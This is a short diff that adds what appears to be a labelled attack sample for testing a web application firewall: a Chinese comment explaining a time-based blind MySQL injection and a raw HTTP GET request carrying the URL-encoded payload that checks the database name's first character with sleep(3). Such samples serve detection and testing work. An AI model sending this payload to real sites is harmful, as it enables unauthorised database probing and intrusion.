@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_延时注入-06506265
+# 基于延时注入,该 SQL 注入语句的攻击目的是通过利用数据库的漏洞，获取当前正在使用的数据库的名称，并检查名称的第一个字符的 ASCII 值是否为 119（'w' 的 ASCII 值）。攻击者利用 and 和 if 语句来执行条件判断，如果条件为真，则执行 sleep(3) 进行延时操作。攻击者通过使用 substr(database(),1,1) 获取当前数据库的名称的第一个字符，并使用 ord() 函数获取该字符的 ASCII 值。通过判断 ASCII 值是否等于 119，攻击者可以推断当前使用的数据库名称的第一个字符是 'w'。这种攻击手段通常用于探测数据库的名称，为后续的攻击或进一步侦察提供有用的信息。
+GET /?id=1%20and%20if%28ord%28substr%28database%28%29%2C1%2C1%29%29=119%2Csleep%283%29%2C0%29&bid=hd_tag_m8mv24co HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24co
+RM-PRO-Token: 5a9f4d7702604c6aabbdc6136b867b5c
+RM-PRO-Time: 1742808374868
+User-Agent: curl/7.83.1
+
